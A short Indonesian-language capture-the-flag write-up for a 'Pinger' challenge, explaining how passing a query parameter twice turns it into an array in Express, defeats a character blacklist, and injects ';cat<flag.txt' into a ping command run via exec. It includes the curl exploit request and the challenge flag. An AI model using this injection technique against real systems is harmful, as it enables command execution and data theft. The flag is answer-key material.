# Pinger - Writeup

Vulnerability: **Command Injection** lewat **Array Parameter Bypass**.

## Analisis
Aplikasi Node.js ini gunain `child_process.exec` buat ngejalanin command `ping`. Ada filter karakter yang cukup ketat di variabel `url`:
```javascript
for (const c of ";()\`|&$ \t\n\r") {
  if (url.includes(c)) {
      return res.render("index", { output: null, error: "Contraband detected!" })
  }
}
```
Tapi, filter ini cuma efektif kalo `url` itu string. Karena aplikasi ini pake Express, kita bisa ngirim `url` sebagai **Array** dengan cara ngirim query param yang sama berkali-kali (`?url=...&url=...`).

Kalo `url` itu Array, method `url.includes(c)` bakal ngecek apakah ada salah satu elemen di array yang **sama persis** sama karakter `c`. Jadi kalo kita kirim `;cat<flag.txt`, pengecekan bakal return `false` karena string `;cat<flag.txt` gak sama persis sama `;`.

Waktu Array ini dimasukin ke template literal:
```javascript
exec(`ping -c 1 -W 2 ${url}`, ...)
```
Node.js bakal otomatis nge-join array tadi pake koma (`,`). Command yang dieksekusi jadi:
`ping -c 1 -W 2 127.0.0.1,;cat<flag.txt`

Di shell (`sh`), `;` itu command separator. Jadi shell bakal nyoba ping `127.0.0.1,` (bakal gagal), terus lanjut ngejalanin `cat<flag.txt`.

## Eksploitasi
Kirim request dengan parameter `url` ganda:
```bash
curl "http://chal.sieberr.live:22002/?url=127.0.0.1&url=;cat<flag.txt"
```

Flag: `sctf{f3ll_f0r_tHe_h3si}`
